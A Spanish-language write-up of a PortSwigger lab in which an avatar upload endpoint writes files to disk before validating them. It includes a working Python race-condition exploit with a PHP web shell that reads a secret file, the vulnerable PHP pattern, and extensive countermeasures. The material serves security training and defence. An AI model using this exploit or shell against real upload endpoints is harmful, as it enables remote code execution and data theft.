# Writeup: Web shell upload via race condition (PortSwigger)

- **Lab**: Web shell upload via race condition
- **URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
- **Categoría**: File upload / Race condition / TOCTOU / Web shell / RCE
- **Dificultad**: Expert
- **Credenciales**: `wiener:peter`

---

## 1. Objetivo

Mismo target (`/home/carlos/secret`), mismo endpoint (`/my-account/avatar`). La defensa: el server **escribe el archivo a disco antes de validar**. Si la validación falla, devuelve 403 al cliente y borra el archivo. Pero entre la escritura y el borrado hay una ventana de unos milisegundos durante la cual `/files/avatars/exploit.php` es accesible. Si un GET cae en esa ventana, Apache lo ejecuta antes de que la validación lo elimine.

Bypass: race condition — uploader continuo + readers concurrentes a la URL del archivo. El primer GET que cae dentro de la ventana ejecuta el PHP y devuelve el secret.

Detalle clave: el upload **devuelve 403 al cliente** (rechazado), pero el archivo sí estuvo en disco durante el procesamiento. El 403 es misleading — sugiere que el archivo nunca aterrizó, cuando en realidad aterrizó y luego fue borrado.

### Insight central

**TOCTOU (Time-Of-Check Time-Of-Use) en el server: el "check" (validación) y el "use" (almacenamiento permanente o borrado) son operaciones secuenciales sobre estado compartido (el filesystem)**. Cualquier observador externo puede hacer un "use" concurrente entre las dos operaciones del server. La defensa naïve asume que el cliente solo puede observar el resultado final (200/403); ignora que durante el procesamiento el resultado intermedio (archivo en disco) es accesible vía otros endpoints. Defensa correcta: validar **antes** de escribir (validación in-memory), o escribir a un staging path no-accesible y mover atómicamente al directorio público solo si pasa.

---

## 2. Recon y resolución

### 2.1 Diagnosticar la nueva defensa

Login `wiener:peter`. Probar todos los bypasses anteriores del cluster con raw PHP:

- `exploit.php` directo → 403 "Sorry, only JPG & PNG files are allowed".
- Polyglot JPEG+PHP del lab anterior → también rechazado o termina en `/files/avatars/<filename>` pero sirve como JPEG (sin ejecución).

La defensa parece estricta: rechaza todo lo que no sea imagen pura. ¿Cómo entonces hay race condition?

La pista está en la descripción oficial del lab: el server "procesa el upload en dos etapas, primero copiando el archivo a un directorio antes de validarlo". Esto significa que **el archivo está físicamente en disco durante la validación**, antes del rechazo. La race window es entre escritura y borrado.

### 2.2 Probar manualmente sin éxito

Subir `exploit.php` y, **inmediatamente después** del 403, navegar a `/files/avatars/exploit.php`:

- 99% de las veces: 404 (la validación ya borró el archivo).
- Necesitamos coincidencia de microsegundos. Manualmente imposible.

### 2.3 Automatizar la race con un script Python

Estrategia: dos pools de threads.

- **Uploaders** (5): bucle infinito subiendo `exploit.php`. Cada upload abre una ventana nueva.
- **Readers** (30): bucle infinito haciendo `GET /files/avatars/exploit.php`. Cualquier read que caiga dentro de la ventana lee el archivo procesado por PHP.

```python
SHELL = b"<?php echo 'BEGIN_'.file_get_contents('/home/carlos/secret').'_END'; ?>"

def uploader():
    s = requests.Session(); s.cookies.set("session", SESSION)
    while not stop.is_set():
        files = {'avatar': ('exploit.php', SHELL, 'image/jpeg')}
        data = {'user': 'wiener', 'csrf': CSRF}
        s.post(f"{LAB}/my-account/avatar", files=files, data=data, timeout=5)

def reader():
    s = requests.Session()
    while not stop.is_set():
        r = s.get(f"{LAB}/files/avatars/exploit.php", timeout=3)
        m = re.search(r"BEGIN_(.+?)_END", r.text or "")
        if m:
            result.append(m.group(1)); stop.set()
```

Marcadores `BEGIN_..._END` en el output del PHP para distinguir el secret real (vs 404 HTML, vs código fuente PHP literal devuelto cuando el archivo se sirve sin parsear).

### 2.4 Resultado

```
[*] Sanity check...
[sanity] upload status=403 body=...'only JPG & PNG files are allowed'...
[sanity] read status=404 body=...'404 Not Found'...
[*] Spawning 5 uploaders + 30 readers...
[  2s] upload_ok=0 upload_err=2 reads=28

>>> SECRET: ClVCpOAjwkhD789mcCyKgnGhn3UUeWIH
```

**< 2 segundos** desde el spawn de threads. Notable: `upload_ok=0` (todos los uploads devolvieron 403), pero el secret se obtuvo igual. **Confirma que el archivo existe en disco durante el procesamiento del 403**.

---

## 3. Por qué funciona

### 3.1 Anatomía del bug

```php
// Antipatrón - escribir antes de validar
function handle_upload($file) {
    $dest = '/var/www/files/avatars/' . $file['name'];
    move_uploaded_file($file['tmp_name'], $dest);   // [W] Escribe en disco
    
    // El archivo es accesible vía HTTP entre [W] y [V]/[D]
    
    $type = mime_content_type($dest);                // [V] Valida
    if (!in_array($type, ['image/jpeg', 'image/png'])) {
        unlink($dest);                                // [D] Borra
        http_response_code(403);
        die("Sorry, only JPG & PNG files are allowed");
    }
}
```

Tres operaciones secuenciales: **W**rite → **V**alidate → **D**elete. Cada una toma tiempo:

- W (`move_uploaded_file`): ~1-5ms (rename atómico desde tmp).
- V (`mime_content_type`): ~1-10ms (open + read primeros bytes + libmagic).
- D (`unlink`): ~0.5-2ms (syscall).

Entre [W] y [D] hay **~2-15ms** durante los cuales el archivo existe en `/files/avatars/exploit.php` y es servido por Apache. Apache procesa la extensión `.php` con el motor PHP, ejecuta nuestro `<?php>`, retorna el output.

El cliente ve 403 (respuesta del thread del upload), pero un cliente paralelo accediendo al archivo durante esa ventana ve 200 con el output del PHP.

### 3.2 ¿Por qué la respuesta 403 es misleading?

El 403 corresponde **a la operación de upload** (POST /my-account/avatar). Le dice al cliente "el upload fue rechazado". Pero la operación que matters acá no es el resultado del upload, es **la existencia transitoria del archivo en el filesystem**. Esas son dos cosas distintas:

- **Estado de la operación**: 403 (rechazada).
- **Estado del recurso**: el archivo existió, fue accesible, ahora ya no.

El antipatrón es asumir que estos dos estados son equivalentes. La defensa naïve dice "rechazo el upload, así que no hay archivo malicioso disponible". La realidad es "rechazo el upload, pero el archivo malicioso fue brevemente disponible".

### 3.3 TOCTOU clásico generalizado

Race conditions de tipo TOCTOU aparecen en muchos contextos:

| Dominio | Time of Check | Time of Use | Bypass |
|---|---|---|---|
| File upload (este lab) | mime_content_type sobre archivo en disco | unlink después del check | GET concurrente entre los dos |
| `access()` + `open()` en C | `access(path, R_OK)` | `open(path)` | symlink swap entre los dos |
| Privilege check + acción | `is_admin(user)` | mutar resource | rotación de sesión entre check y action |
| Cache invalidation | check si entry expiró | usar entry | invalidación entre los dos |
| Email confirmation tokens | check si token válido | mutar estado | reuso del token entre check/use |
| Auth + uso de archivo | check permisos | leer archivo | swap del archivo entre los dos |

Patrón estructural: **una decisión de seguridad evalúa un estado, y luego una acción asume que el estado no cambió**. Cualquier mutación concurrente del estado entre los dos puntos es vector de ataque. La defensa correcta es **atomicidad** — combinar el check y el use en una operación que no se puede interleavear, o usar locks/transacciones.

### 3.4 ¿Por qué este lab es Expert y no solo Practitioner?

A diferencia de los labs anteriores donde el bypass era un cambio en el filename, Content-Type o contenido, este requiere:

- **Conocimiento de TOCTOU** y cómo se manifiesta en uploads.
- **Tooling para concurrencia**: el bypass no es viable manualmente. Se necesita scripting (Python/Burp Pro Turbo Intruder).
- **Modelo mental de pipeline server-side**: entender que un 403 al cliente no implica que el archivo nunca existió en disco.

Es el primer lab del cluster donde el atacante necesita escribir un exploit funcional, no solo construir un payload. La habilidad probada es código de explotación, no análisis de input.

### 3.5 ¿Por qué los uploads devuelven 403 y aún así funciona?

Detalle no obvio del análisis. Posibles arquitecturas server-side:

**Arquitectura A — Validación sincrónica post-write** (este lab):

```
1. Recibir POST /my-account/avatar
2. Mover tmp → /files/avatars/exploit.php
3. Abrir el archivo recién escrito
4. Detectar magic bytes
5. Si no es JPEG/PNG: unlink y devolver 403
6. Si es JPEG/PNG: devolver 200
```

La ventana entre 2 y 5 (~2-15ms) es el window de race. **El upload es rechazado** pero el archivo estuvo accesible.

**Arquitectura B — Validación pre-write** (no vulnerable a este race):

```
1. Recibir POST /my-account/avatar
2. Validar magic bytes desde el tmp file (sin moverlo a /files/)
3. Si no es JPEG/PNG: devolver 403 sin escribir
4. Si es JPEG/PNG: mover a /files/avatars/
```

Sin window — el archivo nunca aterriza en `/files/`.

**Arquitectura C — Staging dir + atomic move** (defensa correcta):

```
1. Recibir POST /my-account/avatar
2. Mover tmp → /staging/<random>.tmp (no expuesto vía HTTP)
3. Validar
4. Si pasa: rename a /files/avatars/exploit.png (atomic)
5. Si falla: unlink el staging file
```

`/staging/` no es servido por Apache, así que aunque el archivo esté ahí durante la validación, no es accesible vía HTTP. El move final es atómico (rename a otro path en el mismo filesystem).

### 3.6 Defensa correcta

```php
// Fix - validar antes de escribir, en memoria
$tmp = $_FILES['avatar']['tmp_name'];

// Validacion sobre el tmp file (no movido aun)
$mime = mime_content_type($tmp);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    http_response_code(403); die("File type not allowed");
}

// Re-encoding tambien en tmp (defensa contra polyglots, ver lab anterior)
$img = imagecreatefromjpeg($tmp);
if (!$img) { http_response_code(400); die("Invalid image"); }
imagedestroy($img);

// Solo despues de pasar todas las validaciones, mover al directorio publico
$new_name = bin2hex(random_bytes(16)) . '.jpg';
$dest = '/var/www/files/avatars/' . $new_name;
move_uploaded_file($tmp, $dest);
```

O alternativa más robusta con staging dir:

```php
// Fix - staging dir no-publico + atomic rename
$staging = '/var/staging/' . bin2hex(random_bytes(16)) . '.tmp';
move_uploaded_file($_FILES['avatar']['tmp_name'], $staging);

// Validar (puede ser caro: re-encoding, AV, etc.)
$mime = mime_content_type($staging);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    unlink($staging);
    http_response_code(403); die("File type not allowed");
}

// Atomic move al directorio publico solo si paso
$new_name = bin2hex(random_bytes(16)) . '.jpg';
$dest = '/var/www/files/avatars/' . $new_name;
rename($staging, $dest);  // Atomico en mismo filesystem
```

Reglas:

1. **Validar antes de escribir al directorio público**, no después.
2. **Si la validación es cara** (re-encoding, AV scan, ML model), usar staging dir no-accesible vía HTTP.
3. **Move final atómico** (rename dentro del mismo filesystem) — no una secuencia open/write/close que deja el archivo a medio escribir.
4. **Filename server-controlled** (rename a UUID) — incluso si el race se ganara, el atacante no sabe el filename para hacer el GET.

### 3.7 Patrón estructural completo del cluster

| Lab | Defensa | Bypass | Asunción rota |
|---|---|---|---|
| `rce-via-web-shell-upload` | ninguna | `exploit.php` | (no hay defensa) |
| `content-type-restriction-bypass` | Content-Type del part | header → `image/jpeg` | "Content-Type cliente = tipo real" |
| `path-traversal` | strip `../` + dir sin scripts | `..%2fexploit.php` | "filename = nombre, no path" |
| `extension-blacklist-bypass` | blacklist PHP | `.htaccess` + `.l33t` | "extensiones ejecutables son fijas" |
| `obfuscated-file-extension` | blacklist + `.htaccess` blocked | `exploit.php%00.jpg` | "validar string = validar path final" |
| `polyglot-web-shell` | magic bytes del contenido | JPEG+PHP via exiftool | "magic bytes = formato único" |
| **`race-condition` (este)** | validación post-write con borrado | upload spam + read spam concurrentes | "rechazo al cliente = archivo no existió" |

Siete labs, siete asunciones rotas. La defensa estructuralmente correcta unifica todas: validar antes de escribir, en staging si es caro, con magic bytes + re-encoding + filename server-controlled + atomic move + dir sin scripts + mínimo privilegio.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Probar bypasses anteriores con raw PHP - rechazados]
    B[2. Pista del lab: 'first copies file then validates']
    C[3. Diagnosticar window: archivo existe entre write y delete]
    D[4. Script Python: 5 uploaders + 30 readers concurrentes]
    E[5. Sanity check: upload da 403, archivo no aparece manualmente]
    F[6. Race spawn: window se hit en menos de 2s]
    G[7. PHP ejecuta dentro de la ventana, devuelve secret]
    H[8. Submit secret - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H
```



Tres ideas:

1. **TOCTOU en el server: estado de la operación ≠ estado del recurso**. El 403 al cliente dice "upload rechazado", pero entre la escritura y el borrado el recurso fue brevemente accesible. Asumir equivalencia entre los dos estados es bug categórico.
2. **Race conditions requieren tooling concurrente**: el bypass no es manual. Scripting con threads (Python `requests`), Burp Pro Turbo Intruder, o request grouping de Burp 2024+. Sin concurrencia, la ventana de ms es imposible de hit.
3. **Defensa correcta = validar antes de escribir al directorio público**: si la validación es cara, usar staging dir no-accesible vía HTTP. El move final al directorio público es atómico (rename) solo después de pasar validaciones. Cierra el race por construcción.

---

## 5. Contramedidas

1. **Validar antes de escribir al directorio público**: pasar el archivo del tmp del framework directamente al validador (`mime_content_type($tmp)`, `imagecreatefromjpeg($tmp)`). Solo después de todas las validaciones, mover al directorio público.
2. **Staging dir no-accesible vía HTTP**: si la validación es cara (re-encoding, AV scan, ML), almacenar temporalmente en un dir fuera del document root durante el procesamiento.
3. **Atomic rename para el move final**: `rename($staging, $public_dest)` es atómico dentro del mismo filesystem. No hay window de archivo a-medio-escribir en el directorio público.
4. **Filename server-controlled (UUID)**: incluso si el race se gana, el atacante no sabe el filename para hacer el GET. Defensa-en-profundidad robusta contra esta clase de bug.
5. **Re-encoding** (defensa heredada del lab anterior): destruye polyglots aunque el race se gane.
6. **Mínimo privilegio del proceso**: el web server no debe poder leer fuera del directorio de assets.
7. **Rate limiting en uploads**: detectar spam de uploads (5+/segundo del mismo user) y bloquear. Defensa contra el patrón típico del exploit (no defensa de la vulnerabilidad raíz).
8. **Logging y alertas**: monitorear ratio de uploads-rechazados/uploads-totales por user; spike anómalo es señal de exploit en curso.
9. **Tests automatizados de race conditions**: por cada endpoint que escribe-luego-valida, suite que dispara writes concurrentes con reads y verifica que el read nunca devuelva contenido transitorio. Difíciles de escribir pero detectan la clase de bug.
10. **Code review checklist**: cualquier `move_uploaded_file($tmp, $public)` seguido de validación es candidato a bug. Marcar.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Web shell upload via race condition*. https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
- PortSwigger Web Security Academy. (s.f.). *File upload vulnerabilities*. https://portswigger.net/web-security/file-upload
- PortSwigger Web Security Academy. (s.f.). *Race conditions*. https://portswigger.net/web-security/race-conditions
- OWASP Foundation. (s.f.). *Race Condition*. https://owasp.org/www-community/vulnerabilities/Race_condition
- OWASP Foundation. (s.f.). *File Upload Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- MITRE Corporation. (2024). *CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition*. https://cwe.mitre.org/data/definitions/367.html
- MITRE Corporation. (2024). *CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization*. https://cwe.mitre.org/data/definitions/362.html
- MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
- MITRE Corporation. (2024). *ATT&CK Technique T1505.003: Server Software Component — Web Shell*. https://attack.mitre.org/techniques/T1505/003/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Race Condition*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition
- Kettle, J. (2023). *Smashing the state machine: the true potential of web race conditions*. PortSwigger Research. https://portswigger.net/research/smashing-the-state-machine
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 10 (Attacking Back-End Components — File Upload Vulnerabilities).
- Inventario interno: [`inventario/04-explotacion/web/explotacion-fileupload.md`](../../../inventario/04-explotacion/web/explotacion-fileupload.md)
- Labs hermanos del cluster:
  - [`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`](../file-upload-rce-via-web-shell-upload/writeup.md)
  - [`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`](../file-upload-content-type-restriction-bypass/writeup.md)
  - [`learning/portswigger/file-upload-path-traversal/writeup.md`](../file-upload-path-traversal/writeup.md)
  - [`learning/portswigger/file-upload-extension-blacklist-bypass/writeup.md`](../file-upload-extension-blacklist-bypass/writeup.md)
  - [`learning/portswigger/file-upload-obfuscated-file-extension/writeup.md`](../file-upload-obfuscated-file-extension/writeup.md)
  - [`learning/portswigger/file-upload-polyglot-web-shell/writeup.md`](../file-upload-polyglot-web-shell/writeup.md)
